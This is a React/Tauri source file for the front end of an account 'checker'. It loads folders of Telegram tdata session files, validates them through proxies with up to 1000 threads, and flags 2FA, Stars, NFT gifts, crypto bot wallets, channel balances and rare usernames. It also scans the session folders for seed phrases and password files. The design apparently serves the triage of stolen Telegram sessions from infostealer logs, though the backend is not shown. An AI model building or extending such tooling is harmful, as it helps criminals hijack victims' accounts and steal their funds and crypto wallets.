import { useState, useRef, useEffect, lazy, Suspense } from "react";
import { invoke } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";
import { FolderOpen, Play, Trash2, AlertTriangle } from "lucide-react";
import { ThreadInput } from "@/components/ThreadInput";
import { useT } from "@/i18n";

// lazy: CheckerResults pulls in recharts; load only when results are shown
const CheckerResults = lazy(() => import("@/components/CheckerResults").then(m => ({ default: m.CheckerResults })));

interface CheckerOptions {
  valid: boolean;
  twoFa: boolean;
  stars: boolean;
  channels: boolean;
  channelsMin: number;
  groups: boolean;
  groupsMin: number;
  shortTag: boolean;
  shortChannelTag: boolean;
  nftGifts: boolean;
  premium: boolean;
  cryptoBots: boolean;
  seedPhrases: boolean;
  passFiles: boolean;
  channelCount: boolean;
  phone888: boolean;
  nftTags: boolean;
  shortId: boolean;
  regDate: boolean;
  channelBalances: boolean;
  addToPanel: boolean;
  threads: number;
}

interface CheckerStats {
  valid: number;
  invalid: number;
  pending: number;
}

export interface CheckerAccount {
  id: number;
  username: string;
  phone: string;
  premium: boolean;
  premium_until: number | null;
  has_2fa: boolean;
  stars: number;
  spamblock: "none" | "temp_geo" | "perm" | "frozen";
  channels: { title: string; subscribers: number }[];
  groups: { title: string; members: number }[];
  nft_gifts: string[];
  nft_tags: string[];
  phone888: boolean;
  reg_date: string | null;
  seed_found: boolean;
  seed_text: string;
  pass_files: string[];
  pass_file_paths: string[];
  short_tag: string | null;
  short_id: boolean;
  crypto_bots: { send: boolean; xrocket: boolean };
  subscriptions: number;
  channel_balances: { title: string; type: string; stars: number; ton: number }[];
  source_path: string;
}

export function CheckerPage() {
  const t = useT();
  const [folders, setFolders] = useState<string[]>([]);
  const [running, setRunning] = useState(false);
  const [logs, setLogs] = useState<string[]>([]);
  const [stats, setStats] = useState<CheckerStats>({ valid: 0, invalid: 0, pending: 0 });
  const [noProxyWarning, setNoProxyWarning] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [accounts, setAccounts] = useState<CheckerAccount[]>([]);
  const [invalidCount, setInvalidCount] = useState(0);
  const logsRef = useRef<HTMLDivElement>(null);

  const [options, setOptions] = useState<CheckerOptions>(() => {
    try {
      const saved = localStorage.getItem("checker_options");
      if (saved) return { ...{
        valid: true, twoFa: false, stars: false, channels: false, channelsMin: 100,
        groups: false, groupsMin: 100, shortTag: false, shortChannelTag: false,
        nftGifts: false, premium: false, cryptoBots: false, seedPhrases: false,
        passFiles: false, channelCount: false, phone888: false, nftTags: false,
        shortId: false, regDate: false, channelBalances: false, addToPanel: false, threads: 5,
      }, ...JSON.parse(saved) };
    } catch {}
    return {
      valid: true, twoFa: false, stars: false, channels: false, channelsMin: 100,
      groups: false, groupsMin: 100, shortTag: false, shortChannelTag: false,
      nftGifts: false, premium: false, cryptoBots: false, seedPhrases: false,
      passFiles: false, channelCount: false, phone888: false, nftTags: false,
      shortId: false, regDate: false, channelBalances: false, addToPanel: false, threads: 5,
    };
  });

  useEffect(() => {
    localStorage.setItem("checker_options", JSON.stringify(options));
  }, [options]);

  const [allowNoProxy, setAllowNoProxy] = useState(false);
  const [hasProxies, setHasProxies] = useState(false);

  const IS_DEV = !("__TAURI_INTERNALS__" in window);

  useEffect(() => {
    if (IS_DEV) return;
    invoke<{ allow_no_proxy?: boolean; checker_threads?: number; checker_channels_min?: number; checker_groups_min?: number }>("get_settings").then((s) => {
      setAllowNoProxy(!!s.allow_no_proxy);
      if (s.checker_threads) setOptions(p => ({ ...p, threads: s.checker_threads! }));
      if (s.checker_channels_min) setOptions(p => ({ ...p, channelsMin: s.checker_channels_min! }));
      if (s.checker_groups_min) setOptions(p => ({ ...p, groupsMin: s.checker_groups_min! }));
    }).catch(() => {});
    invoke<number>("get_proxy_count").then((c) => setHasProxies(c > 0)).catch(() => {});
  }, []);

  const addLog = (msg: string) => {
    setLogs((prev) => [...prev.slice(-500), `[${new Date().toLocaleTimeString("ru-RU")}] ${msg}`]);
    setTimeout(() => logsRef.current?.scrollTo(0, logsRef.current.scrollHeight), 50);
  };

  const handleLoadFolder = async () => {
    if (IS_DEV) {
      setFolders((p) => [...p, "C:\\example\\sessions"]);
      addLog(`${t("checker.loadFolder")}: C:\\example\\sessions`);
      setStats((s) => ({ ...s, pending: s.pending + 3 }));
      return;
    }
    const { open } = await import("@tauri-apps/plugin-dialog");
    const selected = await open({ multiple: true, directory: true });
    if (!selected) return;
    const paths = Array.isArray(selected) ? selected : [selected];

    for (const p of paths) {
      if (folders.includes(p)) continue;
      addLog(`Scanning: ${p}`);
      const count = await invoke<number>("checker_scan_folder", { path: p });
      if (count > 0) {
        setFolders((prev) => [...prev, p]);
        setStats((s) => ({ ...s, pending: s.pending + count }));
        addLog(`Found ${count} accounts in ${p}`);
      } else {
        addLog(`No tdata folders in ${p}`);
      }
    }
  };

  const handleClearFolders = () => {
    setFolders([]);
    setStats({ valid: 0, invalid: 0, pending: 0 });
    addLog("Folders cleared");
  };

  const handleStart = async () => {
    if (folders.length === 0) {
      addLog(`${t("common.error")}: no folders loaded`);
      return;
    }
    if (!hasProxies && !allowNoProxy) {
      setNoProxyWarning(true);
      return;
    }
    setRunning(true);
    setStats({ valid: 0, invalid: 0, pending: stats.pending });
    setAccounts([]);
    setInvalidCount(0);
    addLog(`${t("checker.startCheck")} (${options.threads} ${t("common.threads")})...`);

    // listen for real-time events
    const unLog = await listen<string>("checker-log", (e) => {
      addLog(e.payload);
    });
    const unAccount = await listen<CheckerAccount>("checker-account", (e) => {
      setAccounts((prev) => [...prev, e.payload]);
    });
    const unStats = await listen<string>("checker-stats", (e) => {
      if (e.payload === "valid") {
        setStats((s) => ({ ...s, valid: s.valid + 1, pending: Math.max(0, s.pending - 1) }));
      } else {
        setStats((s) => ({ ...s, invalid: s.invalid + 1, pending: Math.max(0, s.pending - 1) }));
        setInvalidCount((c) => c + 1);
      }
    });
    const unDone = await listen<string>("checker-done", () => {
      setRunning(false);
      setShowResults(true);
      unLog();
      unAccount();
      unStats();
      unDone();
    });

    const opts = { ...options, parseAging: true, regDate: true };
    await invoke("checker_start", { folders, options: opts });

    // checker_start enqueues the task and returns immediately
    // actual completion is signaled via "checker-done" event
    // fallback: if no done event within 5 min after invoke returns, show results anyway
    // (the invoke returns instantly since it just enqueues)
  };

  const allChecksKeys: (keyof CheckerOptions)[] = [
    "twoFa", "stars", "channels", "groups", "shortTag", "shortChannelTag", "nftGifts",
    "premium", "cryptoBots", "seedPhrases", "passFiles", "channelCount",
    "phone888", "nftTags", "shortId", "channelBalances",
  ];

  const allChecked = allChecksKeys.every((k) => options[k]);

  const toggleAll = () => {
    const newVal = !allChecked;
    const patch: Partial<CheckerOptions> = {};
    for (const k of allChecksKeys) patch[k] = newVal as any;
    setOptions((prev) => ({ ...prev, ...patch }));
  };

  const toggle = (key: keyof CheckerOptions) => {
    if (key === "valid") return;
    setOptions((prev) => ({ ...prev, [key]: !prev[key] }));
  };

  const checks: { key: keyof CheckerOptions; label: string; locked?: boolean; hasInput?: "channelsMin" | "groupsMin" }[] = [
    { key: "valid", label: t("checker.optValid"), locked: true },
    { key: "twoFa", label: t("checker.opt2fa") },
    { key: "stars", label: t("checker.optStars") },
    { key: "channels", label: t("checker.optChannels"), hasInput: "channelsMin" },
    { key: "groups", label: t("checker.optGroups"), hasInput: "groupsMin" },
    { key: "shortTag", label: t("checker.optShortTag") },
    { key: "shortChannelTag", label: t("checker.optShortChannelTag") },
    { key: "nftGifts", label: t("checker.optNftGifts") },
    { key: "premium", label: t("checker.optPremium") },
    { key: "cryptoBots", label: t("checker.optCryptoBots") },
    { key: "seedPhrases", label: t("checker.optSeedPhrases") },
    { key: "passFiles", label: t("checker.optPassFiles") },
    { key: "channelCount", label: t("checker.optChannelCount") },
    { key: "phone888", label: t("checker.optPhone888") },
    { key: "nftTags", label: t("checker.optNftTags") },
    { key: "shortId", label: t("checker.optShortId") },
    { key: "channelBalances", label: t("checker.optChannelBalances") },
  ];

  return (
    <div className="space-y-5">
      <p className="text-sm text-muted-foreground">{t("descriptions.checker")}</p>
      {/* no proxy warning */}
      {noProxyWarning && (
        <div className="flex items-center gap-3 rounded-md border border-destructive/30 bg-destructive/5 px-4 py-3 text-sm">
          <AlertTriangle className="h-4 w-4 text-destructive shrink-0" />
          <span>{t("checker.noProxyWarning")}</span>
          <button onClick={() => setNoProxyWarning(false)} className="ml-auto text-muted-foreground hover:text-foreground">✕</button>
        </div>
      )}

      {/* action bar */}
      <div className="flex items-center gap-3 flex-wrap">
        <button
          onClick={handleLoadFolder}
          disabled={running}
          className="flex items-center gap-1.5 rounded-md border border-border bg-card px-3 py-1.5 text-sm font-medium hover:border-primary/50 transition disabled:opacity-50"
        >
          <FolderOpen className="h-3.5 w-3.5" />
          {t("checker.loadFolder")}
        </button>
        <button
          onClick={handleStart}
          disabled={running || folders.length === 0}
          className="flex items-center gap-1.5 rounded-md border border-border bg-card px-3 py-1.5 text-sm font-medium hover:border-primary/50 transition disabled:opacity-50"
        >
          <Play className="h-3.5 w-3.5" />
          {running ? t("checker.checking") : t("checker.startCheck")}
        </button>

        {/* threads */}
        <div className="flex items-center gap-2 text-sm text-muted-foreground">
          <span>{t("common.threads")}:</span>
          <ThreadInput value={options.threads} onChange={(v) => {
            setOptions((p) => ({ ...p, threads: v }));
            if (!IS_DEV) invoke("patch_settings", { patch: { checker_threads: v } }).catch(() => {});
          }} min={1} max={1000} />
        </div>

        <button
          onClick={handleClearFolders}
          disabled={running || folders.length === 0}
          className="flex items-center gap-1.5 rounded-md border border-border bg-card px-3 py-1.5 text-sm font-medium text-muted-foreground hover:text-destructive hover:border-destructive/30 transition disabled:opacity-50"
        >
          <Trash2 className="h-3.5 w-3.5" />
          {t("checker.clearFolders", { count: folders.length })}
        </button>
      </div>

      {/* checkboxes */}
      <div className="space-y-2">
        <label className="flex items-center gap-2 text-sm font-medium cursor-pointer">
          <input
            type="checkbox"
            checked={allChecked}
            onChange={toggleAll}
            className="rounded border-border accent-primary"
          />
          {t("checker.checkAll")}
        </label>
        <div className="grid grid-cols-3 gap-x-6 gap-y-2">
        {checks.map((c) => (
          <div key={c.key} className="flex items-center gap-2">
            <label className="flex items-center gap-2 text-sm text-muted-foreground font-medium cursor-pointer">
              <input
                type="checkbox"
                checked={options[c.key] as boolean}
                onChange={() => toggle(c.key)}
                disabled={c.locked}
                className="rounded border-border accent-primary"
              />
              <span className={c.locked ? "text-foreground font-medium" : "font-medium"}>{c.label}</span>
            </label>
            {c.hasInput && options[c.key] && (
              <span className="inline-flex items-center gap-1 text-xs text-muted-foreground ml-1">
                <span>&gt;</span>
                <input
                  type="number"
                  min={1}
                  value={options[c.hasInput]}
                  onChange={(e) => {
                    const val = Math.max(1, parseInt(e.target.value) || 1);
                    setOptions((prev) => ({ ...prev, [c.hasInput!]: val }));
                    if (!IS_DEV) {
                      const patchKey = c.hasInput === "channelsMin" ? "checker_channels_min" : "checker_groups_min";
                      invoke("patch_settings", { patch: { [patchKey]: val } }).catch(() => {});
                    }
                  }}
                  className="w-14 rounded border border-border bg-card px-1.5 py-0.5 text-xs text-center outline-none focus:border-primary/50"
                />
              </span>
            )}
          </div>
        ))}
      </div>
      </div>

      {/* separate option */}
      <div className="flex flex-col gap-2 border-t border-border pt-3">
        <label className="flex items-center gap-2 text-sm text-muted-foreground font-medium cursor-pointer">
          <input
            type="checkbox"
            checked={options.addToPanel}
            onChange={() => setOptions((prev) => ({ ...prev, addToPanel: !prev.addToPanel }))}
            className="rounded border-border accent-primary"
          />
          {t("checker.addToPanel")}
        </label>
      </div>

      {/* stats */}
      <div className="flex items-center gap-6 text-sm font-semibold">
        <span>{t("common.valid")}: <span className="text-[oklch(0.65_0.1_150)]">{stats.valid}</span></span>
        <span>{t("common.invalid")}: <span className="text-[oklch(0.55_0.1_25)]">{stats.invalid}</span></span>
        <span>{t("common.pending")}: <span className="text-muted-foreground">{stats.pending}</span></span>
      </div>

      {/* console */}
      <div className="rounded-xl border border-border bg-card overflow-hidden">
        <div
          ref={logsRef}
          className="h-40 overflow-y-auto scrollbar-thin p-4 font-mono text-xs space-y-0.5"
        >
          {logs.length === 0 ? (
            <div className="text-center text-muted-foreground py-8">
              {t("checker.scanPlaceholder")}
            </div>
          ) : (
            logs.map((line, i) => (
              <div key={i} className="text-muted-foreground whitespace-pre-wrap break-all">{line}</div>
            ))
          )}
        </div>
      </div>

      {showResults && (
        <Suspense fallback={null}>
          <CheckerResults
            open={showResults}
            onClose={() => setShowResults(false)}
            accounts={accounts}
            invalidCount={invalidCount}
            enabledChecks={options}
          />
        </Suspense>
      )}
    </div>
  );
}
